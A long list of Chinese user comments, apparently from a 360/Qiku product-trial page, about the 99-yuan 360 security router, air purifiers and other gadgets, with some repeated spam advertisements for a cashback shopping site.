容易误按！！而且婆婆的华为，在已经启动照相机的情况下用智键拍照没问题，如果在没有启动照相机的情况下用，拍出来的照片就不正常，光线很暗，而且照片是红色的。
非常好用。但是我的黄色的，很容易脏啊，都不知道为什么就变黑了，而且也清理不掉
确实不错啊，真想体验一把
不知可否当成锅盖来用················
看起来很牛B的样子，还可以加镜头
后期滤芯价格高不高，如果能加入静电除尘技术也很不错。减少滤芯的负担，成本能节约。价格实惠的话，绝对大卖。
产品介绍挺不错的，还可以互联网远程操作
真不错，赞
帅啊，怎么弄的？
从没有试过免费的午餐，看起来不错
感觉挺不错的产品，希望能得到试用机会
对有车一族还是挺有用的啊。
产品介绍挺不错的，还可以互联网远程操作 ,非常喜欢，想使用！
高，大，上
你是想加入360的硬件团队吗？你是做什么的？
好东西啊，经济实用啊。有了这个就再也不用担心。
支持360.支持奇酷网。
很好的一款产品，支持。
现在蓝牙概念的智能产品越来越多了。
看的外观感觉真的很酷呀
看的感觉真的很好呀，要是能免费的使用的话那就太好了哈哈哈
360,tcl，大品牌，值得信赖！
智能家居系统已经很多很多了，从高端到民用价格上万到几百不等，主要还是需要界面和安全性上进行考虑，如果需要在精装房配置的话需要公安部的检测报告。
主要是4g卡的流量伤不起啊
价格太贵了
电源线短的不方便
想起了小时候的糖稀
装逼利器，感觉以后会加入对电脑或者电视什么的手势遥控，那就更实用了。
新颖，时尚、大气，功能领先，绿色环保，家居必备！
已认真提交“我的申请”，静候佳音......
等待试用，希望意见能够有用。
好东西，给一个。
好东西...
高科技，期待
看中的就是科技智能   期待试用
4卖血！5卖肾！6！有没有买心的？
上车的时候还要找支撑物，但是还是在省钱中。 
终于快等到了~~~~期待中
100以内可以的
看着就不错！
看上去不错哦，想试用……
酷。。。。。。。。。
智能化的 完美产品
的确不错啊 
最期待的一款路由器。简洁、大方、安全、实用。
酷…………
多少钱？？？！！
很智能，各方面都不错。
什么时候有售？
真不错，如果能显示号码，想接就接，不想接就挂能就更好了
就这样的产品，用户接受面比较窄吧？只能用作达人、潮人收藏族的精品
有没有靠点谱的价格，就内地大连这工资买它的饿3个月肚子，还得赶上打折，要不白费
既然是开源linux，希望能安装mentohust，这样校园网用户一定大增！
可不可以加上光控制？就是戒指的边缘加上类似雷达的东西，手一晃动能告诉你前面有障碍物，这东西就能为盲人朋友解决多少麻烦了
想买一台..................
我有鼻炎 到啦春天 老是一个烦恼工作都不能正常下去
现在的空气污染严重，空气清洁是未来的发展趋势，
是不要插网络线吗 ？
价格才是硬道理，再好一看价。。。。。。
老周说了，为了灭小米，360路由器白送还倒贴36 
看起来很牛B的样子
好想试试啊
貌似哈可以
这么快结束了。。。。。
很好很实用的一款小东西，功能齐全实用，但抓拍功能有时会出问题，拍出的照片会黑屏，其他都很好。
价格才是硬道理，做的柔软一点
我要试用这个
试后才有发言权
要怎么购买啊？想要一台
华丽丽的外表，价格呢
我要买 开启吧
我也要！！！！！！！！！！！！！！！！！ 
外观犹如飞碟，值得期待
我也买 快开吧
抄袭bh503  诺基亚会起诉的
试过才知道好用不好用
离开手机还能用吗
高大上！！
好东西,就是价格高了,1500人民币可行
信号接收发射怎么样啊?
东西是好,肯定贵求得很
价格多少？还有什么时候开始预定？
热切期待中
帅呆了，高大上呐。。。
多少钱呢？想要来一台
轻巧便捷，去上学用这个，真的是风雨无阻永不迟到了。。
小米电视是47寸。
看起来很好哦，不知道怎么样
建议去小米官方售后服务。或者直接拨打客服。
功能实用，买来试试，360随身wifi还不错，看这款能不能力压小米！
建议去小米官方售后服务。或者直接拨打客服。
哎。看看吧。。学生伤不起。
我的水星总掉线，想要入手一台
外观很酷，但是略显厚重，建议外观再精简，超薄更简单才能显出科技与品质！
这个不错 什么时候可以买啊
好困。快开始吧。。。
设备的气质不错，不知道效果怎么样，噪音大不大。
多少钱一台？ 
太有创新了，大赞！
怎么样买，想要！需要连接网线吗？
360wifi 很好 这个估计也很给力
瞬间羞涩了~~哈哈~~
还有一个多小时呢？喜欢360的产品
期待惊爆价格！
我也想买，不知道价格会不会贵
没意中看到360路由，买来用用看有没有说得那么好。
酷毙了，默默的问一句，产品什么时候出来！
加油！！期待~！
还是要看效果
99元，价格已经出来了！！！
难道是69元吗
大爱啊 相信价格也不会很高200以内！~
怎么不标最小滤径是多少
这个我觉得还是很实用的，对于上班族或者长期驾驶的人来说，边娱乐边工作，两不误。
活性炭重量是多少
太高大上了，有档次。很想拥有
送我一台吧   看起来就很实用 
我们想试试，好使唔！ 
做工相当不错，但误按的几率实在太高，不实用！
 我刚在奇酷网预约了一台#99元360安全路由#。裸奔路由太可怕，是时候换一台安全路由啦！@360安全路由 安全第一，最高性价比的双频AC智能路由器，终极特价只需99元，倾力相助帮你终结裸奔路由。超值价格机会难得，小伙伴们快来预约吧！预约地址：http://t.cn/8srVgHI&#039;
咋买呀？ffff 
马达是磁悬浮技术吗？如果是噪音很小，耗电量很低，否则。。。。
我要一个，快快
99.99元可以了吗？ 
http://p0.qhimg.com/1     微博图片在此，首批1W台
想来一个，亲
好好好，还有两个版本，还带子路由！！O(∩_∩)O哈哈哈~
http://p0.qhimg.com/t01a5a1ae69defdda64.jpg
马上 要有新房子了 搞一台用用 也8错
对于手指的大小是不是有所限制？应该增加调节装置
希望能有外接移动硬盘接口，这样就可以无线控制路由下载，可以无限提高容量。
99元要了
好想買   幾時有的賣
订一个,什么时间能订
这路由器恩呢更不能桥接啊？
这路由器支不支持跟水星路由器桥接啊？
要是可以免费，那该多好呀。360主打免费
很好的东西
我想给我两个侄儿和侄女买一个。也不知道什么时候可以开售。
看着就不错 好想拥有一台
199信不信，拭目以待
挺帅的，不知道都有什么功能
69 谁抢到谁拿走！！！
8g小点，最少16g起步
让我们拭目以待
订一个,什么时间能订 
还不开始，有数量限制没有
酷，人人都买得起。 
如何？需要网线吗？ 
神马！送我一台吧!看起来很实用!
很想买，我要买。
太神奇了，我要！
99元，首发1W台
首发1W台
支持69无限拍
价格才是王道
中国人和人家简直是两个世界的人啊
为什么不给我们看路由器后面的接口？？？
为什么中国就做不出这样的设计呢？中国人只会山寨么？我相信苹果，谷歌等大企业里一定有中国人，为什么我 们就不行呢？
99，我也要一个，呵呵
还没开始出售？
应该119吧
看样子很喜欢  啊  
我也要，怎么购买？ 
神马！是不是真的啊送我一台吧!看起来很实用! 
会是109吗？
家里刚装修完，一个月后就要入住。这台空气净化器正是我迫切需要的。看她的性能甚至超过某些国外知名品牌，好想拥有她呢！
啊不知道效果如何！期待试用，刚买了两套房，正少个净化的，哈哈
能买吗现在
如果价位不是太高的化，还是有市场潜力的！
还有15分钟  期待ing………………………… 
新房子刚刚装好，进入紧张的家具安装阶段，虽说用的全是环保产品，但是挡不住开封的风沙大啊，刚刚好就看到了这个东东，期待试用，给宝宝一个更舒适的空间。
内测用户飘过~
后面估计只有1个LAN口，所以不敢暴露。。。
期待中，希望可以体验一下
怎么用的？
不知可否直接插在电源上长时间使用，上面说充电后用两个小时，可不可以一直用。 
支持首发89元一台 
还有5天已经16万多了，人气相当旺哦。不知道是哪20位幸运者获得？很期待啊
希望360不要做饥渴营销
家里的房子住了快半年了，总觉房间里面有股味道，期待着有这样的好产品。
时间越来越近了，期待中。
EcoTower 可以遥控433的无线开关吗？
强烈要求露屁股！！！！
兄弟，您好！空气净化器要关注的指标是最小滤净粒子、过滤速度、智能化和能源节约等，而不是花里胡哨的一些看似很好玩，实际没有作用的功能！
家里的房子住了快半年了，期待着有这样的好产品。
期待中，希望体验一下
99的体验价格。可以去预约啦！
按照现在的流行价格，99.9元估计
赶紧买吧啊
100到200之间才可以接受
可以买了 赶紧买
您好，这个手表转卖吗？
新装修房子 期待
怎么用？跟别的路由器一样吗
只能说已经过时了。我用的机顶盒。还可看所有电视，电影。
真的99.刚好久的不正常了，换掉
期待一下下
什么过时了？？路由器过时了？
电信网的有吗？
预约成功！
预约了一台  
应该是99元
对于幼儿来说，经常玩水，爬高爬低的，为什么不再设计其他款式的，比如项链 脚环，皮带扣。。。
您好，空气净化器顾名思义就是过滤空气的，您要关注的指标最重要的是最小滤净粒子，即它能过滤掉最小的粒子直径是多少微米，国家规定0.3微米就可以，但是实际上很多可致病菌的粒子都小于0.3微米。我学这个的，想了解也可以加我微信，419664439，免费咨询！
希望大卖...............
您好，空气净化器顾名思义就是过滤空气的，您要关注的指标最重要的是最小滤净粒子，即它能过滤掉最小的粒子直径是多少微米，国家规定0.3微米就可以，但是实际上很多可致病菌的粒子都小于0.3微米。我学这个的，想了解也可以加我微信，419664439，免费咨询！
预约了一台 
预约容易，抢购难，才一万台。
是不是预约了 必须把旧的路由器邮寄过去啊，我的旧的不是无线的啊
太丑啦！好丑啊！唉！原谅我不能昧着良心说话！弄的真的好丑~
还要久的寄回去，那不是很蛋疼
什么破东西啊 有时候必须按两下才好用 抓拍的时候像素一丁点也不清楚 录音都不知道保存在哪怎么也找不到  希望跨快更新这些问题
是呀，旧的正在用怎么寄回去呢。一天也离不了的。
难道用256的内存成本会猛增吗？ 请对比一下网件6300v1版本和v2版本
申请一台放在办公室，让同事们见证一下效果，实际效果好过嘴说评论，来个实事求是
可以以旧换新吗？
能不好好其他路由器串联用
好像是99元啊
终于等360安全路由器了，赞一个
预约成功，还得在京东上抢购
什么时候上市啊？
何时有售啊？
期待中... 
能不能给个全图，背面不让看什么意思.连一台还是几台电脑。
估计不会便宜。
如果家里喜欢点檀香的，会不会立即分解掉？
长得有些难看。
两个版本供用户选择，一个是普通的标配路由器，另外一个是给有信号增强需求的用户提供的带增益天线的版本 两个版本，价格一样吗？旧路由器还得寄给你们才有这个价吗？
说得好，引人深思！！！
http://cnrdn.com/PNrD 哈哈预约成功了！
看你是来要回复的。我专门找到了，给你回复一下。
脑残请看上面
是无线路由器吗
终于育有成功了。。。。。。。。
太贵了，太贵了，太贵了，
厉害，可以体验下
很感兴趣！！！
有时候感觉马航370的黑匣子电池短了。这里应该增加陌生区域提醒功能。
好东西，价格再亲民些就好了。
什么时候可以试用？？
好东西，真期待~~
成功预约!
这个预约等于没有，到时还是得在京东上再跟没来预约的人一起抢的。
之前挺不错的，有单击，双击，长按三种模式！ 后来把APP更新，怎么只能单击一个功能了！！！！！ 不解呀。。。
喝水不要钱了，矿泉水卖不出去了
很酷，近视的能带上是幸福的事情啊
这东西真的好,不过估计不是大多数人能购买的.
感觉挺帅的哦。也想弄一个感受一下科技
感觉很需要，特别适合干苦逼的IT类。
一定要用旧机换吗？
你绝对是拿资本主义钱的五毛
空气好的地方才能这样吧，我们这空气不好，能行吗？
能连着两次发帖的人 不拿钱你信吗？ 
有了他便认周天之物
怎么预约呀 ？
我关心的是 是不是必须要把旧的路由器寄给你们才能99元的价格买360路由器，还是旧的路由器给你们可以抵360路由器的货款，还有就是后面有几个孔？我们有三个人在用，所以孔必须要够！最后还有预约之后是不是还要和京东的人一起抢
tcl一直都很好 期待这个的效果 
真心希望市场上出现高效低价的空气净化器，最重要的就是净化空气中甲醛以及现在大家最关心的pm2.5的能力，真心希望好用，如果很有效，表示会买。
空气会变得更干燥 ，，，，，
你的问题太多了。。哈哈哈。。。。。。。。。
不过感觉现在市面上空气净化器的价格真心有点贵，动不动就上万了，就像之前一个外国人自制空气净化器上电视的那个，用一个风扇加上一个过滤网，一共就花了200多块钱就达到了吸附空气中pm2.5的效果，而且看着效果不错，而市面上的净化器只是在这个基础上又加了两层过滤网，一层杀菌的，一层吸甲醛的，从200元到近万元，这中间的差价差在哪里？
要抢的。要抢的。这么便宜的价格肯定得抢。
这次只有预约的人才会有可能拿到资格。所以没有预约的人肯定买不到。
顿时觉得高大上啊~~不错的东东啊
这个加个DIY比较好，自己使用单片机制作控制系统，类似小型雕刻机，只是把主轴换成这东西。效果会比较好。
什么时候预售，已经预约了，发售时会邮件提醒？
早上市了 ，299
高科技的产品一直很喜欢。 
汽车里用不错 现在家用车都带USB供电
您好，您的手表转卖吗？
终于可以换一个好的路由器了。
您好，您的手表转卖吗？
应该加个夜晚免打扰设置。还有，您的手表转卖吗？
单身公寓。期待神器！！！
这个真心可以有。蛮不错了
使用报告好简洁啊。还有，您的手表转卖吗？
白让人等了半天，现在还以预约。浪费人世间
不是吧，神奇倒是神奇，不过会不会有点不好啊。要是上街一不小心就曝光了咋办？
还不错。希望越住越好
这个可以、就是防不防水和防不防摔。
试用报告挺幽默的。还有，您的手表转卖吗？
创意非常好，而且价格实惠。如果在不开机的情况下，空气质量检测一直开启就更完美了。
我也要买一个
这标题让我联想到成人动作大片。还有，您的手表转卖吗？
基站定位误差是比较大，所以有录音功能来配合。还有，您的手表转卖吗？
360 还得了啊 很好 我发现我钱不够用了 
不是说四月下旬吗，都5月了还是不见踪影
100以下，可以考虑买一个。
居然支持双系统。安卓和IOS都支持。
这个太酷了。希望能在奇酷网买到啊。
有点贵。不过却是是好东西。
空气本来就污染了 生成的水还能喝？
这ydh2119明显就是来捣乱的么
这么高级、？有点不相信。
太遗憾了，额的手机不是安卓4•0的!但是也特别感谢360团队！
为什么我不能中签？？？？怒怒怒怒
长期用会伤眼吗？ 
好酷，好想要
这样会很好，可以通过手机等职能装备检查是否关闭电源，希望以后的生活越来越智能。
貌似不错不知道真的可以喝吗？
希望他有个功能，晚上自动给我把手机拿开，这样晚上玩手机的同时还可以保护身体。
给力啊。。
我买的诺西的皮套电池 何止增加8小时。以前只能用20个小时不到，现在可以40个小时！ 
可一号双拨么？
more beautifull than goole glass
创意非常好，而且价格实惠。如果在不开机的情况下，空气质量检测一直开启就更完美了。 
好像不会给学生机会，，，，，俺每天都会跑步锻炼的有木有
我就把它当成防尘塞在用，360也就这个能耐了。而且只有单击，真可笑。
很不错，是个多功能产品，而且很方便，可以打电话什么的，手机都不用带很方便，运动时也很方便，赞一个！
非常棒.. 
同问 也是我要问的 希望回答
这个可以有啊～
没有加湿效果，空气会非常干燥的
写的很好，赞一个！运动达人！
感觉很好，很想试试，不知道价格怎么样？？
htc one 可以用么？
多少米防水？还有什么功能？辐射大吗？
梦寐以求啊，无人驾驶概念车！ 要是价格好就好了
绝对有前途
旧机器他可以收回去再翻新啊 这还不简单。。。
你真脑残，机顶盒的 那是歌华的宽带！还过时了。。。。你是猴子请来的逗比吗？
这个什么时候出来呢啊
这个不错，我喜欢。
要是能在我们这里弄个样板就好了。
期待使用！
没有网口的图片介绍啊，几个网口呢？
支持奇酷的试用活动，能让大家充分了解奇酷产品和性能。
好酷，好想要 
这玩意好啊，既美观又实用。。。
不知道具体参数啊，信号覆盖面积有多大啊？穿墙能力到底有多强啊？能穿几堵墙呢？
好棒啊，好像要 
好产品，要被大众接受，希望价位不会太高 
我了个去，我根本就我天天会用到的热熔枪。。。。什么时候升级成3D打印笔了。。。 有什么需要接续或粘合的时候，我就会用到它。。。。
要抢的。要抢的。这么便宜的价格肯定得抢。 
我了个去，这根本就是我天天会用到的热熔枪。。。。什么时候升级成3D打印笔了。。。 有什么需要接续或粘合的时候，我就会用到它。。。。
怎么才能获得？
好想要 !!!!
真管用吗？？？
真管用吗？？？
真是逗比!小学没毕业么？你们认得几个字却理解不了么！看东西只看一半的么！sb~没看到寄不寄由你决定么？无线路由是要几个网口给你插才够啊~ 
很漂亮的音箱，
热熔枪穿了个马甲就成了3D打印笔
很有创意，很想要啊^_^
非常的喜欢，
很好，特想买一个给女朋友看动画片^_^
折扣渠道秒杀发布群http://url.cn/KYJrK2
长期携带对耳朵有何影响。      可添加新功能：1.监测脑电波，科学帮助人转换脑电波，促使人体进入所需状态，帮助改善学习工作和睡眠。   2.监测四期睡眠，个性化制定睡眠计划，提供合理叫醒服务。
这个干吗用？
要是 在我们这里 开个小公司， 那是太多人需要了。  我专业负责这水电工程这块的！
很神奇的赶脚~~
配合空气加湿器使用 效果肯定好~
见过最丑的路由器！你仿别的都行干嘛仿小米盒子，还加条天线，奇丑无比！
这种设备早就出来了，淘宝上50元一个
是奇虎旗下的产品吧
要多少钱啊... 
呵呵 奇虎产品肯定不错
很酷的眼镜喜欢。
价格好高。
很期待阿！只是不要搞抢购就好
希望可以得到这次试用的机会
这个是可以的。
这，是一片绿色的港湾，我们和360携手前行
多年以来，360呵护着我们，从最开始一键升级所有升级包，到免费为千百万用户提供电脑保护，并时刻关注网上的各种不安定因素，一方面关爱我们，另一方面不断提升技术水平，站在行业的最前沿。大家知道么，从防护软件开始，360只要收取适当的费用，那都是一笔不小的资金，但360没这么做。这是大爱，这是无私，这是能力和水平。360，值得我们全国网民的敬重。我由衷支持360，并为有360感到骄傲和自豪！
我，不喜欢多说什么，也不喜欢发表什么评论，自知浅薄，但360真的让我非常感动。衷心祝愿360的明天更加美好，我们，将要让这片绿色的港湾，遍及每一个角落，那是春天和阳光
小巧方便，很理想
祝周总和360全体工作者及其家人，生活快乐！身体健康！我们的心，永远和你们在一起！
刚好家里也没有路由器，看到这个消息真开心！
真心不错，另外妹子的身材赞一个！
符合智能家居范围，期待~~~~~
不错，跨行得重生。
360我的爱，愿你永远陪伴在我和我的朋友身边！
699的价格！哎
已经有卖的了
有，喜欢看书的人爱不释手！我买了以后读书时间增多了，玩手机的时间减少了！
不是说可以超越小米mini路由吗？配置看不出来
难道360和腾讯和好了。恭喜
奇酷360，期待你的降临！
北京的客气。。不说了希望能得到一个试用的机会。不过我觉得北京的水也是一大问题，希望出水的过滤器。
企业级处理器搭配128M内存，这个价很实惠！希望软件能优化好！
希望能得到这次机会，为了提高老人的生活质量，为了长辈的身心健康~！ 谢谢
嗯 3D打印笔应还只是一个雏形。概括点说 3D打印笔和热熔枪的成型方式都属于热融离散堆集成型 也就是FDM 工作原理大致一样 具体区别的话 功率不同 耗材不同 细部结构不同。即便是同一事物 摆在创意和心思位置上的一端总能获得较高的价值 正如枯叶可堆以烤红薯 亦可作画其上悬亮处
多年以来，360呵护着我们，从最开始一键升级所有升级包，到免费为千百万用户提供电脑保护，并时刻关注网上的各种不安定因素，一方面关爱我们，另一方面不断提升技术水平，站在行业的最前沿。大家知道么，从防护软件开始，360只要收取适当的费用，那都是一笔不小的资金，但360没这么做。这是大爱，这是无私，这是能力和水平。360，值得我们全国网民的敬重。我由衷支持360，并为有360感到骄傲和自豪！ 
就是好东西！
很酷的外形很美观
超级喜欢，要是能加上通讯功能就更好了
11AC得设备支持！不支持就是个破无线路由!个人认为穿墙信号强才是硬道理！现在有几个设备支持11AC的啊？暂时看无用！在就是2.4G下是多少M？5G下又是多少M？貌似5G穿墙穿不过2.4G吧。。。求科普！
真是超酷的玩意！！
这个能在缩小些就好了
超级喜欢，要是能加上通讯功能就更好了
新家刚刚装修完，我想试一下效果怎么样！
这不就是蛙式车吗，不过就是成人版，搞的好玄乎！
貌似不错，不知道去甲醛效果怎么样，新装修还是有味道
好像很不错啊 
还不错，买了试试
请问这个路由器可以使用有线网线吗
骑行必备！！！不知道价位贵吗？
看起来真的不错，希望把做工和质量搞好，国民现在不差钱，就注重做工和质量。我要一个！
很期待呀！
看起来不错哦    很期待啊   我家刚刚装修的房子，正好可以带回家一试。
没中,伤心 
感官效果很好，就是不知道实用价值了
请问可以接硬盘，实现家庭音影共享吗？
我很喜欢这种设备，可以记录我的行车习惯。
靠，怎么只有一根天线，也叫双天线。
360的东西一直都很不错！我一直信赖360，相信你所出的每一款产品都是最棒的！
没胸难怪让你吃吃吃！
怎么又是一个没凶器的！
这……是什么节奏啊！
知道google glass目前的最大障碍是什么吗？待机时间短啊！才4个小时。不知道这家能不能解决
 我想是不是你出门在外，家里的所有电器都要打开状态才能控制？那能放心出门吗？  
跟科幻电影里面一样了，很好
看起来非常不错！！给人很清新的感觉~~~很期待能有试用的资格
关键来看是否真能起到智能互联的作用，而不是简单读取OBD接口的行车数据..
实在不愿意相信，又是内定了的！还在这里搞！
产品不错呀 喜欢！
试试呗！正好要用到了。
高科技，我就喜欢奇特的东西
真心不错，给360赞一个！！
请问支持在安卓手机上查看wifi连接人数以及是否可以在手机上一键终结关闭不相关的蹭网者吗？
这个东西不错。试试
写了很多评价的话，居然没发表成功！囧！！！总之360随身WiFi在软件方面绝对是同类产品中最好的！
等我以后发达了全部用上。
科技改变生活，创意赢得未来。真的有创意，对生活有帮助，对社会有益处。
用过才知道！！！！
等以后发达了些......好好哦
谢谢官方的认可。哈哈，不枉费我写了好久好久
这啥玩意儿,3D打印版笔,就是一热熔胶枪,五金店有的卖
我正需要这东西
围观的就不要品头论足。胖子的胸和瘦子的腹肌一样没用。懂吗？另外给你普及一下知识，穿运动内衣胸就是会压平，为了防止运动时候胸部震荡过多变下垂。我是70c的胸，我觉得挺合适。再说平胸又怎么了？！
谢谢支持！
100以下可以考虑
拿来做做坏事更好 
一直喜欢360出的产品，赞一个
刚想买一个呢，发现了更好的产品，能让我先试用一下吗?
哈哈 医院都需要配置这个
这个使用起来会不会有问题呀？我是工业分析出身的，在紫外可见光检查中需要有参照项，直接凭空测量可能结果有很大偏差。最后测试的结果可能会对使用者照成误导。希望能把这个解决一下。
公司在北京裂帛，有1000多人，我从事市场工作，能写产品使用感受，能扩散，能传播。求！
医疗净化器 感觉不错  试试呗
这东西比谷歌眼镜还强悍啊
作为女生，再也不需要下楼了
如果加入能分析水中重金属含量是否超标那就完美了！
超想买 没钱呀
因为蝴蝶是拍打翅膀飞过，这样的话形成的就会是一种变形的状态，所以我觉得这种3d成像的效果~~~~~~
怎么买？选完颜色，就选不了尺寸了
台灣可用嗎 
哥们你很强悍很专业啊。期待你有更多更好的作品啊。
漂亮妹子的试用报告很不错啊。又有过程，又晒美图，又晒幸福生活，又有好多好的建议。赞一下。
安全问题啊
还有真实步数和麦步计算步数的对比，不错。看来相对还是很准的。
没离线下载，云盘功能
不能当收音机的天线用吗，哎
十分钟的时间确实够用了。
这个电动车 我觉得就应该和太阳能、风能，结合在一起，这样才能实现长距离续航
近年空气太差，看见了该产品，所以希望能申请试用
带视频不？
真会抢商机
我很想拥有这一款空气净化器啊，就给我一个呗！！！！！
目测不适合亚洲人的扁平脸~~~
1入2出，不够用啊。
有能电磁防辐射功能会更好些
刚好需要一份哦！
手机电脑用360 生活电器用TCL 生活中随处可见  加油、期待更好的产品
想拥有这一款空气净化器
酷~~~~~~~~~
没抢到。。
TA就是一路由器~
城市居住加吸烟的人,就最想得到他
是单路由？还是说猫跟路由一体？
看起来不错哦
看着很强大，不过不知道具体如何
看内容不错，可是没有详细的说明啊
真的期待能拥有一台空气净化器！
目前用的是国外产品，想试试看有什么不一样，国产的会赢过进口的吗，期待可以试用
刚刚装修完，家里人，包括我都非常重视甲醛污染，希望能试试空气卫士的效果
高速上有高速加油站的
终于收到了已是一星期了，无力吐槽EMS，是安全绿哦，我一向是360忠实粉，希望下次还有我的奖品哦……
抓拍 延时太长
装上“智键”后手机放在裤包里时常被误碰，手机里面一堆文件，这个问题似乎是一个解决不了的问题！
我买过飞机给我小侄子玩，都是嫌弃飞行太短。关键是玩完10分钟还得继续充电才可以玩。控制到10分钟真的是设计上的考量吗？ 不见得吧！
 背面都是什么接口
目前用的这个是国外进口的，效果还可以，不过想试试国货，对新鲜事物都有兴趣试试，国货当自强嘛~~~~~
说起来简单，不过你没想到啊
打个1折还可以考虑下
看上去很不错
这个我很喜欢，既消毒还能充电
看似厨余垃圾处理器的升级版，“循环利用，废物回收”，很好很强大！ 两点顾虑：一是堵，不知对“硬骨头、大块头”原料有无限制；二是剩，家庭需要的花肥毕竟有限，多余的卖给政府？这两点不解决，利用率恐不会太高。 价格上应再亲民一些，不然进入国内大众家庭会很难。 个人认为设计成大型商用机器售给宾馆饭店前景会更好。
最近老是感冒，是不家里空气不好，急需这台空气卫士试试效果，嘿嘿
这个有成人版的吗
看起来很不错啊 关注一下··
此神器都分析哪些元素？金属元素可以检测？
这个真的有？
北京雾霾这么重，没有空气卫士怎么行
目前城市空气质量已严重超标，空气净化器是家庭必须品
看起来很酷！
很有创意 有意思
我是很认真的在做报告，哈哈，谢谢亲的认可。让我觉得努力没有白费！
看起来不错，价格就不好说了
我比他们都需要这个净化器，就给我一次机会吧！老天啊，你就垂怜我一次吧！让好运降临到我的头上吧！
还有5天已经破3万了，真是振奋人心的一次试用哦——期待破5万大关。
感觉外观太丑
nice  很不错的创意 这样还可以调节速度呢！ 不错希望能把细节做好 价格也要放到第一位！
别说坏人了，就是幼儿园的小朋友看着好奇玩着玩着都会坏掉了，这种产品首先最起码的就是使用的人有保护产品不让其损坏的意识。。。小孩子明显没有
好东西可以试用吗
不错呢 不过这东西很鸡肋 不会有太多人 可以用上 但不失为很好的创意 （加油）
在想,别告诉我背后就两口的..USB什么的统统没有...
其实就想找那么简单的东西...
图不是很详细 如果可以看到手摇的操作和装置  会不会费力或者容量之类的 拜托 用点心 好吧 不过也是很好的创意
老婆刚有了小孩啊，这是我最急需的啊，求人品
送我一个就好了
为了肚子里的宝宝健康成长，希望好运降临~
刚装修完的房子，迫切需要一台，求人品
很有意思  支持一个
价格真贵，竞争比不强
如果能延伸出“体温发电”是最好的。
看来大家都需要这样棒的环保产品，奇酷，你最酷，生活小惊喜的创造者，顶起！希望自己也有幸能获得试用资格。试用心得届时会及时向大家发布，让奇酷产品在生活中刮起一阵环保、潮流风。
这就是一个改进办的胶枪！大家可以去淘宝搜搜1
距离这么远才报警  有毛用啊   早就飞走了
看着介绍很棒，就是价格上暂时无法考虑了
给我一次机会吧！让我也幸运一次吧 一次就好 让好运降临到我的头上吧！
介似尼玛吗呀？一个玩具两千大洋啊！看来这是专为官二代和富二代设计的
单单安防功能不适用
谁要看后面的图的！http://baike.baidu.com/link?url=ljLaNn6wpoObaGSldMDcjKY3PuKUk5tHkzw0hSeVEPpDC6ywJ9ePFv-TtN_UM5nxZlX3nxqA5wcHcQP1bt4VT_这呢
360安全路由器_百度百科   就有
强 科技感十足
看上去挺好的，但只是介绍了产品的新特性，却不知如何安装使用？
这个还真的没有多少创意，国内大把这种电动车了！只是换了材料而已。例如： www.achieverbike.com 
看到开头..23岁，哇，照片，哇，，更哇的是 我已经是一岁女人的麻麻，楼主辛苦了
不知道适合近视眼人群吗？
这样的好产品不知道什么时间能发售
国产的不智能的锂电池单车有很漂亮的而且价格有绝对优势
我要可以连接电脑的？？？？可以吗？？
我家都是老房子，不急，我想机会还是让给别人吧
这么好的产品必须人手一台，看了这么多评论，我于心不忍，但是我还是得说这四个字：请联系我！！！
我才是最需要的  我缺少氧气=-=
太贵，富人玩物，穷人眼物。
很爽很酷！可惜没有！
看起来还是很智能的，就不知道电池耐用不耐用了
曾经以为自己是网.购老手，每次与小二讲价，磨叽半天！每次都回复：亲，已经是最低价了哦！太累~~~昨天我才知道，淘.宝很多宝贝有隐形折扣，注册【网购我爱帮】http://www.wg528.com [给力]  通过他们链接去淘.宝\拍拍\京东等300多家网站购买，最高可返现35%，后悔呀！看来这年头稍不留神就落伍啦！ http://www.wg528.com [心][good][赞]
曾经以为自己是网.购老手，每次与小二讲价，磨叽半天！每次都回复：亲，已经是最低价了哦！太累~~~昨天我才知道，淘.宝很多宝贝有隐形折扣，注册【网购我爱帮】http://www.wg528.com   通过他们链接去淘.宝\拍拍\京东等300多家网站购买，最高可返现35%，后悔呀！看来这年头稍不留神就落伍啦！ http://www.wg528.com  
曾经以为自己是网.购老手，每次与小二讲价，磨叽半天！每次都回复：亲，已经是最低价了哦！太累~~~昨天我才知道，淘.宝很多宝贝有隐形折扣，注册【网购我爱帮】http://www.wg528.com [给力]  通过他们链接去淘.宝\拍拍\京东等300多家网站购买，最高可返现35%，后悔呀！看来这年头稍不留神就落伍啦！ http://www.wg528.com [心][good][赞]
曾经以为自己是网.购老手，每次与小二讲价，磨叽半天！每次都回复：亲，已经是最低价了哦！太累~~~昨天我才知道，淘.宝很多宝贝有隐形折扣，注册【网购我爱帮】http://www.wg528.com [给力]  通过他们链接去淘.宝\拍拍\京东等300多家网站购买，最高可返现35%，后悔呀！看来这年头稍不留神就落伍啦！ http://www.wg528.com  
以前买过一个普通的踏步机，一点用都没有，还很吵
装修房子，味道难闻，婚期将近，迫切需要，若能中得，定当宣传，只有一句，不胜感激，且给且珍惜。
请问是区别于360移动wifi的无线路由器吗？不需要电脑开机才能使用？
家里半年前装修的房子，孩子现在18个月了，想搬进去住，但是感觉还是有味，本来想去买一台的，但是正好看到了这个试用，就来申请了，中不了的话就再去买！！非常希望能申请到呀！！！
期待呀。在我们这边不知是多钱米米呢
看起来很酷
为了我老婆和我老婆肚子里的宝贝儿，神呐赐予我一台吧！房子装修好一年了都不敢住，赐予我一台让我们一家三口结束漂泊吧！
做出来 的话 我要
住在马路边，准备生宝宝，赐给我一台吧~阿门！还我洁净的空气~~
  可否直接插在电源使用，充电后用两个小时，用的是充电电池吗?
之前买的某品牌净化器，声音大吓死人，想换。
有一个疑问，遇到紧急情况的话。脚在脚踏板上插着，怎么快速抽出
酷酷酷，太棒了，期待
好想有一台
有云上载储存功能吗？
即使外面光照严重 你不也得出门么，知道后反而心里难受！
很酷，不知道戴眼镜的人如何使用，要是能挂近视镜片就好了。
不知道支持的游戏多不多。
价格不贵，就是构建尺寸小点，不能打大件。
价格，价格
那款手机能用？
有创意，支持一下
如果有人放屁了，水中有味吗？
没用过360产品,这个价格不高打算试下.相信360!!
功能挺好用的 不过今天突然***了，按键无法弹出，
肯定后期是可以挂近视镜片的，Google glass的就可以呀。这个估计研制到后期也会加入处方镜片这个方案的
支持360
路由器都出了  怎么还没有出？？？？？？？？？？？？？
我的是光猫 这路由器能当光猫用吗？ 
支持360 .
多参加会中的~~~
没用还是要电源
强悍的一杰作
开车好帮手啊，能不能给我试用啊
开始试用或卖了，一定通知我
多少钱？貌似功能很少，离功能强大还很远呢，600R以下考虑入手
不知何时出货？？？
赐给我一台吧~阿门！还我洁净的空气
一直很喜欢这样的产品，但愿有机会能试用，只是不知道此产品的兼容上有没有问题。
